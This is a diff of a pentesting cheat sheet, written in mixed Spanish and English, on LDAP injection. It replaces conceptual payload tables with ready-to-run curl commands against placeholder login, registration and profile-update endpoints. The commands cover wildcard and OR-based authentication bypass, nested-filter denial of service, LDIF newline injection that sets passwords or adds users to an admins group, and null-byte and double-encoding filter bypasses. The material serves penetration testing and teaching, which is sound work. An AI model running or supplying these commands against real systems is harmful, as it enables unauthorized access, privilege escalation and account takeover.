@@ -24,16 +24,14 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| AND injection `&` | `*)(&(uid=admin)` | Force AND condition. |
-| OR injection `\|` | `*)(\|(uid=*` | Force OR — match all. |
-| NOT injection `!` | `*)(!(uid=admin)(uid=*` | Negation. |
-| Escape filter context | Need to balance parens | `*)(<inject>` |
-| Universal true | `(\|(\|(uid=*` | Always matches. |
-| Universal false | `(&(uid=)(uid=))` | Never matches. |
-| Override filter | `*)(\|(uid=*))(\|(uid=admin)` | Replace original filter logic. |
-| Multi-OR brute | `(\|(uid=a)(uid=b)(uid=c)...)` | Multi-target enum. |
-| AND with conditions | `*)(&(memberOf=admins)(uid=*` | Constrained search. |
-| Negation enum | `(&(uid=*)(!(uid=admin)))` | Find non-admin users. |
+| `curl -d "username=*)(&(uid=admin)&password=any" https://target/login` | Force AND con uid=admin specific | Filter `(&(uid={u})(pass={p}))`. |
+| `curl -d "username=*)(\|(uid=*&password=any" https://target/login` | Force OR — match all users | Standard auth bypass. |
+| `curl -d "username=*)(!(uid=admin)(uid=*&password=any" https://target/login` | Negation — match all NON-admins | Find non-admin users. |
+| `curl --data-urlencode "username=*)(\|(\|(uid=*" --data-urlencode "password=any" https://target/login` | Universal true (always matches) | Compound OR. |
+| `curl -d "username=*)(\|(uid=*))(\|(uid=admin)&password=any" https://target/login` | Override filter logic completo | Replace original filter. |
+| `curl --data-urlencode "username=*)(\|(uid=a)(uid=b)(uid=c)(uid=d))" --data-urlencode "password=any" https://target/login` | Multi-target enum en una request | Multi-OR brute. |
+| `curl -d "username=*)(&(memberOf=cn=admins,dc=target,dc=com)(uid=*&password=any" https://target/login` | Constrained search — solo admins | AND con memberOf. |
+| `curl -d "username=*)(&(uid=*)(!(uid=admin))&password=any" https://target/login` | Find non-admin users (negation) | Negation enum. |
 ^ldap-filter-andor
 
 ### Filter inyectado vs original
@@ -41,51 +39,36 @@ linked:
 ```
 Original: (&(uid={user})(password={pass}))
 
-Injection: user = *)(uid=*
-
-Result:    (&(uid=*)(uid=*)(password={pass}))
-                ^ first segment matches all
-                ^ second still requires password match
-
-# Pero si pass también vulnerable:
-user = *)(|(uid=*       pass = *)(|(uid=*
+Injection: user = *)(|(uid=*       pass = *)(|(uid=*
 
 Result:    (&(uid=*)(|(uid=*))(password=*)(|(uid=*)))
-            ^ matches everyone, both segments OR=true
+            ^ matches everyone, ambos segments OR=true
 ```
 
 ___
 
 ## Nested Filters
 
-| **Payload** | **Notas** |
-|:---:|:---:|
-| `(&(uid={u})(\|(role=admin)(role=manager)))` | Nested OR within AND. |
-| `(\|(&(uid={u})(active=true))(&(uid={u})(emergency=true)))` | Nested AND within OR. |
-| Atacante inyecta nested para confundir parser | Some parsers fail con nesting profundo. |
-| `((((((` | Stack overflow / DoS. |
-| Mismatch parentheses | `(((uid=*)` | Some servers tolerate, others reject. |
-| Escape via inner filter | `(uid={u})(emergency=*)` | Inject second filter at end. |
+| **Comando** | **Qué obtenés** | **Cuándo** |
+|:---:|:---:|:---:|
+| `curl --data-urlencode "username=*)(\|(role=admin)(role=manager))" --data-urlencode "password=any" https://target/login` | Nested OR within AND | Filter complejo. |
+| `curl --data-urlencode "username=*)(\|(&(uid={u})(active=true))(&(uid={u})(emergency=true)))" -d "password=any" https://target/login` | Nested AND within OR | Multi-condition bypass. |
+| `curl -d "username=((((((((&password=any" https://target/login` | Stack overflow / DoS via nesting | Server con parser frágil. |
+| `curl -d "username=(((uid=*)&password=any" https://target/login` | Mismatch parens — error o tolerated | Server differential. |
+| `curl --data-urlencode "username=*)(uid=*)(emergency=*)" -d "password=any" https://target/login` | Inject 3rd filter — bypass conditions | Filter compound trick. |
 ^ldap-filter-nested
 
 ___
 
-## LDAP Attribute Injection (en Add/Modify)
+## LDAP Attribute Injection (Add/Modify)
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concept | App escribe LDAP entries (registración, profile update) sin sanitizar | Modify/Add operations. |
-| Inject extra attribute | Field "name" = `John\nuserPassword: ATTACKER` | LDIF injection. |
-| Add memberOf | `name = John\nmemberOf: cn=admin,dc=...` | Group membership. |
-| Inject via newline | LDIF parser reads each `attr: value` line | Standard inject. |
-| URL-encoded newline | `%0a` literal | When passed through HTTP. |
-| Unicode newline | LF `
-`, CRLF `
-` | Various whitespace. |
-| LDIF directive injection | `name = John\n-\nadd: userPassword\nuserPassword: x` | Multi-op. |
-| Multi-DN inject | Add user to alternate DN | DN injection. |
-| Modify password de otro user | If app permits update by DN with input | Account takeover. |
-| Schema violation injection | Inject attribute not in schema → error | Disclosure. |
+| `curl --data-urlencode "name=John%0auserPassword: ATTACKER" -d "email=x@y.z" https://target/register` | LDIF injection — agregar password al user creado | App permite registration via LDAP modify. |
+| `curl --data-urlencode "name=John%0amemberOf: cn=admins,dc=target,dc=com" https://target/profile/update` | Self-add a admins group | Profile update sin sanitización LDIF. |
+| `curl --data-urlencode "name=John%0a-%0aadd: userPassword%0auserPassword: NEWPASS" https://target/profile/update` | Multi-operation LDIF inject | Modify operation con multi-step. |
+| `curl --data-urlencode "name=$(printf 'John\nuserPassword: x')" https://target/register` | Newline literal en bash | Server-side LDIF construction. |
+| `curl --data-urlencode "name=John%0d%0auserPassword: x" https://target/register` | CRLF injection variant | Some parsers strip LF only. |
 ^ldap-filter-attribute
 
 ___
@@ -94,16 +77,12 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| LDAP no tiene comments oficiales | RFC 4515 doesn't define comments | False trick. |
-| Null byte truncation | `username=admin\x00trailing` | Some apps truncate at NUL. |
-| URL-encoded NUL | `username=admin%00trailing` | Decoded by web layer. |
-| Extra whitespace | LDAP filters tolerate spaces | Edge case. |
-| Encoded chars | `\28` = `(`, `\29` = `)`, `\2a` = `*` | LDAP filter escape. |
-| Hex escape encoding | `\5c` = `\`, `\00` = NUL | Used for binary data. |
-| Bypass filter | Si app sanitiza chars en cleartext, encoded chars pueden pasar | Filter bypass. |
-| Combine con encoding | URL-encode + LDAP-encode | Multi-layer. |
-| Whitespace in values | `attr=value with space` | Server may strip. |
-| Backslash escape | Atacante usa `\28\29` to "escape" filter chars de la app's escaping | Double-encoding. |
+| `curl --data-urlencode "username=admin%00trailing" -d "password=x" https://target/login` | Null byte truncation post-admin | Parser web layer trunca en NUL. |
+| `curl --data-urlencode "username=admin%5c00&password=x" https://target/login` | LDAP-encoded NUL `\00` | Filter injection con encoded NUL. |
+| `curl --data-urlencode "username=admin%5c2a&password=x" https://target/login` | LDAP-encoded wildcard `\2a` (literal `*`) | Bypass app sanitization. |
+| `curl --data-urlencode "username=admin%5c28%5c29&password=x" https://target/login` | Encoded `\28\29` (literal `()`) | Double-encoding bypass. |
+| `curl --data-urlencode "username=admin%2520%29%28uid%3D%2A&password=x" https://target/login` | Doble URL-encoded → decoded twice → injection | Multi-decode parsers. |
+| `curl --data-urlencode "username=admin%09)(uid=*&password=x" https://target/login` (tab) | Whitespace bypass | App strip espacios pero no tabs. |
 ^ldap-filter-comments
 
 ### LDAP filter character escaping (RFC 4515)
@@ -115,7 +94,5 @@ ___
 | `)` | `\29` |
 | `\` | `\5c` |
 | NUL | `\00` |
-
-Si app espera `\2a` literal en input pero atacante manda raw `*`, app puede insertarlo sin escape → LDAP wildcard activado.
 
 ***
